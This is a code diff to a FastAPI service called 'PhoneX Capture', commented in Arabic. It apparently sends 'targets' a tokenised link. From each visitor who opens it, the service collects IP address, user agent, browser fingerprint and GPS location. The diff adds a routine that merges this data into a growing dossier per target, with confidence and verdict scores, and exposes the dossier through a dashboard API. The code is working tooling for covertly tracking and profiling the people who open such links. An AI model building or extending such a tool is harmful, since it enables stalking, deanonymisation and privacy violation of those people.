@@ -10,6 +10,7 @@ from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse, Str
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
 
+from .. import analyze
 from ..config import Config
 from ..http import HttpClient
 from ..providers.ip_geo import lookup_ip
@@ -19,13 +20,11 @@ from ..utils import jload, mask_number, utcnow
 BASE_DIR = Path(__file__).resolve().parent
 TEMPLATES = Jinja2Templates(directory=str(BASE_DIR / "templates"))
 
-
 def client_ip(request: Request) -> str:
     forwarded = request.headers.get("x-forwarded-for", "")
     if forwarded:
         return forwarded.split(",")[0].strip()
     return request.client.host if request.client else ""
-
 
 def create_app(config: Config) -> FastAPI:
     app = FastAPI(title="PhoneX Capture", docs_url=None, redoc_url=None)
@@ -45,6 +44,38 @@ def create_app(config: Config) -> FastAPI:
         if k != expected and x_dash_token != expected:
             raise HTTPException(status_code=401, detail="unauthorized")
 
+    def recompute(token: str, ip: str) -> dict[str, Any]:
+        """إعادة حساب ملف الهدف بعد كل تفاعل ودمجه تراكمياً."""
+        fingerprints = storage.list_fingerprints(token)
+        locations = storage.list_locations(token)
+        events = storage.list_events(token)
+
+        ip_geo: dict[str, Any] = {}
+        for event in reversed(events):
+            if event["kind"] == "ip_geo" and isinstance(event["data"], dict):
+                ip_geo = event["data"]
+                break
+
+        latest = fingerprints[-1]["data"] if fingerprints else {}
+        fresh = analyze.dossier(latest, ip_geo, locations)
+        fresh["stage"] = analyze.stage_of(events)
+        fresh["fp_count"] = len(fingerprints)
+        fresh["loc_count"] = len(locations)
+        fresh["first_seen"] = events[0]["ts"] if events else utcnow()
+
+        previous = storage.get_dossier(token)
+        if previous:
+            fresh = analyze.merge(previous["data"], fresh)
+
+        storage.set_dossier(token, fresh)
+        storage.add_event(
+            token,
+            "dossier",
+            {"confidence": fresh["confidence"], "verdict": fresh["verdict"], "stage": fresh["stage"]},
+            ip,
+        )
+        return fresh
+
     # ── landing ─────────────────────────────────────────────────
     @app.get("/c/{token}", response_class=HTMLResponse)
     async def landing(request: Request, token: str) -> HTMLResponse:
@@ -54,13 +85,15 @@ def create_app(config: Config) -> FastAPI:
                 "<h1 style='font-family:sans-serif'>الرابط غير صالح أو منتهي</h1>",
                 status_code=404,
             )
-        storage.touch_session(token, client_ip(request), request.headers.get("user-agent", ""))
+        ip = client_ip(request)
+        storage.touch_session(token, ip, request.headers.get("user-agent", ""))
         storage.add_event(
             token,
             "open",
             {"ua": request.headers.get("user-agent", ""), "ref": request.headers.get("referer", "")},
-            client_ip(request),
+            ip,
         )
+        recompute(token, ip)
         return TEMPLATES.TemplateResponse(
             "landing.html",
             {
@@ -84,7 +117,8 @@ def create_app(config: Config) -> FastAPI:
         ip = client_ip(request)
         storage.add_fingerprint(token, payload, ip)
         storage.add_event(token, "fingerprint", {"stage": payload.get("stage", "?")}, ip)
-        return JSONResponse({"ok": True})
+        dossier = recompute(token, ip)
+        return JSONResponse({"ok": True, "confidence": dossier["confidence"], "verdict": dossier["verdict"]})
 
     @app.post("/c/{token}/geo")
     async def ingest_geo(request: Request, token: str) -> JSONResponse:
@@ -100,14 +134,17 @@ def create_app(config: Config) -> FastAPI:
         acc = float(payload.get("acc") or 0.0)
         storage.add_location(token, lat, lon, acc, payload)
         storage.add_event(token, "location", {"lat": lat, "lon": lon, "acc": acc}, ip)
-        return JSONResponse({"ok": True})
+        dossier = recompute(token, ip)
+        return JSONResponse({"ok": True, "precision": dossier["geo_precision"]})
 
     @app.post("/c/{token}/event")
     async def ingest_event(request: Request, token: str) -> JSONResponse:
         if storage.get_session(token) is None:
             raise HTTPException(status_code=404, detail="unknown session")
         payload = jload(await request.body(), {})
-        storage.add_event(token, str(payload.get("kind", "custom")), payload, client_ip(request))
+        ip = client_ip(request)
+        storage.add_event(token, str(payload.get("kind", "custom")), payload, ip)
+        recompute(token, ip)
         return JSONResponse({"ok": True})
 
     @app.get("/c/{token}/ip")
@@ -119,6 +156,7 @@ def create_app(config: Config) -> FastAPI:
             data = await lookup_ip(http, ip)
         if data:
             storage.add_event(token, "ip_geo", data, ip)
+            recompute(token, ip)
         return JSONResponse({"ip": ip, "geo": data})
 
     # ── dashboard ───────────────────────────────────────────────
@@ -139,6 +177,15 @@ def create_app(config: Config) -> FastAPI:
         if bundle["session"] is None:
             raise HTTPException(status_code=404, detail="not found")
         return JSONResponse(bundle)
+
+    @app.get("/api/dossier/{token}", dependencies=[Depends(auth)])
+    async def api_dossier(token: str) -> JSONResponse:
+        if storage.get_session(token) is None:
+            raise HTTPException(status_code=404, detail="not found")
+        stored = storage.get_dossier(token)
+        if stored is None:
+            return JSONResponse({"dossier": None})
+        return JSONResponse({"dossier": stored["data"], "ts": stored["ts"]})
 
     @app.get("/api/stream/{token}", dependencies=[Depends(auth)])
     async def api_stream(token: str, request: Request) -> StreamingResponse:
@@ -175,9 +222,7 @@ def create_app(config: Config) -> FastAPI:
         return PlainTextResponse(
             json.dumps(bundle, ensure_ascii=False, indent=2, default=str),
             media_type="application/json",
-            headers={
-                "Content-Disposition": f'attachment; filename="phonex-{token}.json"'
-            },
+            headers={"Content-Disposition": f'attachment; filename="phonex-{token}.json"'},
         )
 
     @app.get("/healthz")
